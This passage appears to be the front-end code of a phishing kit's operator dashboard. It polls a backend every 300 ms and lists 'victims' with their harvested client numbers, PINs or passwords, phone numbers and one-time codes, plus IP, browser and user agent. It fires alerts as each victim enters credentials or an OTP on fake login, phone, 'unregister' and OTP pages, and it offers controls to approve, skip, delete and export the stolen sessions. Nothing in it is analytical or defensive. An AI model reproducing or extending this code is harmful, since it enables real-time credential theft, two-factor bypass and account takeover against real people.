      if (isFirstLoad) {
        lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
        isFirstLoad = false;
        return;
      }
      
      newSessions.forEach(s => {
        const old = lastSessions.get(s.sid);
        if (!old) {
          showAlert('info', 'NEW VISITOR', `Connected from ${s.ip}`, s.victimNum);
          if (s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
        } else {
          if (!old.entered && s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
          if (!old.phone && s.phone) showAlert('info', 'ENTERED PHONE', `Phone: ${s.phone}`, s.victimNum);
          if (!old.unregisterClicked && s.unregisterClicked) showAlert('warning', 'CLICKED UNREGISTER', 'Victim proceeded to unregister', s.victimNum);
          if (!old.otp && s.otp) showAlert('success', 'ENTERED OTP', `OTP: ${s.otp}`, s.victimNum);
          if ((old.page !== 'success' && s.page === 'success') || (old.status !== 'approved' && s.status === 'approved')) {
            showAlert('success', 'LOGIN APPROVED', 'Victim completed full flow', s.victimNum);
          }
        }
      });
      lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
    }

    /* ----------  RENDER  ---------- */
    function pageTitle(f){
      if (f === 'success') return 'APPROVED';
      switch(f){
        case 'index.html': return 'LOGIN';
        case 'verify.html': return 'PHONE';
        case 'unregister.html': return 'UNREGISTER';
        case 'otp.html': return 'OTP';
        default: return f;
      }
    }
    
    function isApproved(s) {
      return s.page === 'success' || s.status === 'approved';
    }
    
    function render(d){
      qs('#userName').textContent = d.username;
      qs('#settingsUser').textContent = d.username;
      qs('#total').textContent    = d.totalVictims;
      qs('#success').textContent  = d.success;
      qs('#domainLink').textContent = d.domain || 'localhost';
      qs('#domainLink').href        = d.domain || 'http://localhost';

      qs('#statTotal').textContent = d.totalVictims;
      qs('#statSuccess').textContent = d.success;

      const activeSessions = d.sessions.filter(s => !isApproved(s));
      qs('#active').textContent = activeSessions.length;

      const body = qs('#tbl tbody');
      const empty= qs('#empty');
      
      if(!d.sessions.length){ body.innerHTML=''; empty.style.display='block'; return; }
      empty.style.display='none';
      
      body.innerHTML = d.sessions.map(s => {
        const approved = isApproved(s);
        const isSelected = selectedSessions.has(s.sid);
        return `
        <tr data-sid="${s.sid}" class="${approved ? 'approved' : ''}">
          <td class="select-col">${approved ? '' : `<div class="checkbox-custom session-checkbox ${isSelected ? 'checked' : ''}" data-sid="${s.sid}" onclick="toggleSelect('${s.sid}', event)"></div>`}</td>
          <td>${s.victimNum}</td>
          <td><span class="cred">${s.email||'—'}</span></td>
          <td><span class="cred">${s.password||'—'}</span></td>
          <td><span class="cred">${s.phone||'—'}</span></td>
          <td><span class="cred">${s.otp||'—'}</span></td>
          <td><a class="ip-link" onclick="openIpLookup('${s.ip}')" title="Lookup IP">${s.ip}</a></td>
          <td>${s.platform}</td>
          <td>${s.browser}</td>
          <td><div style="font-weight:600;color:${approved?'var(--green)':''}">${pageTitle(s.page)}</div>${statusText(s)}</td>
          <td>${actionButtons(s)}</td>
        </tr>`;
      }).join('');
      
      updateSelectionUI();
    }

    /* ----------  MULTI-SELECT  ---------- */
    function toggleSelect(sid, event) {
      event.stopPropagation();
      if (selectedSessions.has(sid)) {
        selectedSessions.delete(sid);
      } else {
        selectedSessions.add(sid);
      }
      updateSelectionUI();
    }

    function toggleSelectAll() {
      const allSids = jsonData.sessions.filter(s => !isApproved(s)).map(s => s.sid);
      if (selectedSessions.size === allSids.length) {
        selectedSessions.clear();
      } else {
        allSids.forEach(sid => selectedSessions.add(sid));
      }
      updateSelectionUI();
    }

    function clearSelection() {
      selectedSessions.clear();
      updateSelectionUI();
    }

    function updateSelectionUI() {
      const batchActions = qs('#batchActions');
      const selectAllBox = qs('#selectAllBox');
      const count = selectedSessions.size;
      
      qs('#selectedCount').textContent = count;
      batchActions.classList.toggle('active', count > 0);
      
      // Update select all checkbox
      const allSids = jsonData.sessions.filter(s => !isApproved(s)).map(s => s.sid);
      selectAllBox.classList.toggle('checked', count > 0 && count === allSids.length);
      
      // Update individual checkboxes
      qsa('.session-checkbox').forEach(box => {
        const sid = box.dataset.sid;
        box.classList.toggle('checked', selectedSessions.has(sid));
      });
    }

    async function deleteSelected() {
      if (!confirm(`Delete ${selectedSessions.size} sessions? This cannot be undone.`)) return;
      
      const promises = Array.from(selectedSessions).map(sid => 
        fetch('/api/panel', {
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({action:'delete', sid})
        })
      );
      
      await Promise.all(promises);
      selectedSessions.clear();
      updateSelectionUI();
      load();
    }

    /* ----------  IP LOOKUP  ---------- */
    function openIpLookup(ip) {
      const cleanIp = ip.split(':')[0];
      window.open(`https://db-ip.com/${cleanIp}`, '_blank');
    }

    /* ----------  MODALS  ---------- */
    function showDetail(sid){
      const s = jsonData.sessions.find(x=>x.sid===sid);
      if(!s)return;
      currentSid = sid;
      const approved = isApproved(s);
      
      qs('#modalTitle').textContent = `Victim #${s.victimNum}${approved ? ' (APPROVED)' : ''}`;
      qs('#modalSubtitle').textContent = `${s.ip} • Connected ${fmtDate(s.dateStr)}`;
      
      const activityHtml = s.activityLog && s.activityLog.length ? 
        s.activityLog.slice().reverse().map(log => `
          <div class="activity-item">
            <div class="activity-meta">
              <div class="activity-action">${log.action}</div>
              ${log.detail ? `<div class="activity-detail">${log.detail}</div>` : ''}
            </div>
            <div class="activity-time">${fmt(log.time)}</div>
          </div>
        `).join('') : '<div style="color:var(--text-muted);font-size:12px;padding:8px 0">No activity recorded</div>';
      
      qs('#modalBody').innerHTML = `
        <div class="info-grid">
          <div class="info-section">
            <div class="info-label">Session ID</div>
            <div class="info-value mono" style="font-size:11px">${s.sid}</div>
          </div>
          <div class="info-section">
            <div class="info-label">Current Page</div>
            <div class="info-value" style="color:${approved?'var(--green)':'var(--blue)'}">${pageTitle(s.page)}${approved ? ' ✓' : ''}</div>
          </div>
          <div class="info-section">
            <div class="info-label">Client Number</div>
            <div class="info-value mono">${s.email||'—'}</div>
          </div>
          <div class="info-section">
            <div class="info-label">PIN / Password</div>
            <div class="info-value mono">${s.password||'—'}</div>
          </div>
          <div class="info-section">
            <div class="info-label">Phone Number</div>
            <div class="info-value mono">${s.phone||'—'}</div>
          </div>
          <div class="info-section">
            <div class="info-label">OTP Code</div>
            <div class="info-value mono">${s.otp||'—'}</div>
          </div>
          <div class="info-section full-width">
            <div class="info-label">System Information</div>
            <div style="display:grid;grid-template-columns:repeat(3, 1fr);gap:12px;margin-top:8px">
              <div>
                <div style="font-size:11px;color:var(--text-muted);margin-bottom:2px">Platform</div>
                <div style="font-size:13px;font-weight:500">${s.platform}</div>
              </div>
              <div>
                <div style="font-size:11px;color:var(--text-muted);margin-bottom:2px">Browser</div>
                <div style="font-size:13px;font-weight:500">${s.browser}</div>
              </div>
              <div>
                <div style="font-size:11px;color:var(--text-muted);margin-bottom:2px">IP Address</div>
                <div style="font-size:13px;font-weight:500"><a class="ip-link" onclick="openIpLookup('${s.ip}')">${s.ip}</a></div>
              </div>
            </div>
            <div style="margin-top:12px">
              <div style="font-size:11px;color:var(--text-muted);margin-bottom:4px">User Agent</div>
              <div class="info-value small">${s.ua}</div>
            </div>
          </div>
        </div>
        <div class="activity-section">
          <div class="activity-title">Activity Log (${s.activityLog ? s.activityLog.length : 0} events)</div>
          <div class="activity-log">${activityHtml}</div>
        </div>
        ${!approved ? `
        <div class="delete-section">
          <div class="delete-info">Permanently remove this session from active sessions</div>
          <button class="btn btn-danger" onclick="confirmDelete('${s.sid}')">Delete Session</button>
        </div>
        ` : '<div style="margin-top:20px;padding-top:20px;border-top:1px solid var(--card-border);color:var(--green);font-size:13px;text-align:center;">✓ This session has been approved and completed</div>'}`;
      
      qs('#modal').style.display='flex';
    }
    
    function closeModal(){
      qs('#modal').style.display='none';
      currentSid = null;
    }

    /* ----------  SETTINGS  ---------- */
    function openSettings() {
      qs('#settingsModal').style.display = 'flex';
    }
    
    function closeSettings() {
      qs('#settingsModal').style.display = 'none';
    }
    
    function showConfirmDelete() {
      closeSettings();
      qs('#confirmModal').style.display = 'flex';
    }
    
    function closeConfirm() {
      qs('#confirmModal').style.display = 'none';
    }
    
    async function executeDelete() {
      await fetch('/api/refresh', {method: 'POST'});
      lastSessions.clear();
      selectedSessions.clear();
      isFirstLoad = true;
      closeConfirm();
      load();
    }

    function confirmDelete(sid){
      if(confirm('Are you sure you want to delete this session? This action cannot be undone.')){
        act('delete', sid);
        closeModal();
      }
    }

    /* ----------  CONTROL  ---------- */
    async function act(action,sid){
      const endpoint = action === 'skip' ? '/api/skip' : '/api/panel';
      await fetch(endpoint, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({action: action === 'skip' ? 'skip' : action, sid})
      });
      load();
    }

    /* ----------  LOGOUT + EXPORT  ---------- */
    qs('#logoutBtn').onclick = async () => {
      lastSessions.clear();
      selectedSessions.clear();
      isFirstLoad = true;
      await fetch('/panel/logout',{method:'POST'});
      location.replace('/panel');
    };
    qs('#exportBtn').onclick = () => location.href = '/api/export';
    qs('#settingsBtn').onclick = openSettings;

    /* ----------  LONG-POLL  ---------- */
    async function load(){
      const d = await fetch('/api/panel').then(r=>r.json());
      if(d.error)return location.replace('/panel');
      jsonData = d;
      checkChanges(d.sessions);
      render(d);
      setTimeout(load,300);
    }
    
    loadTheme();
    load();
  </script>
</body>
</html>

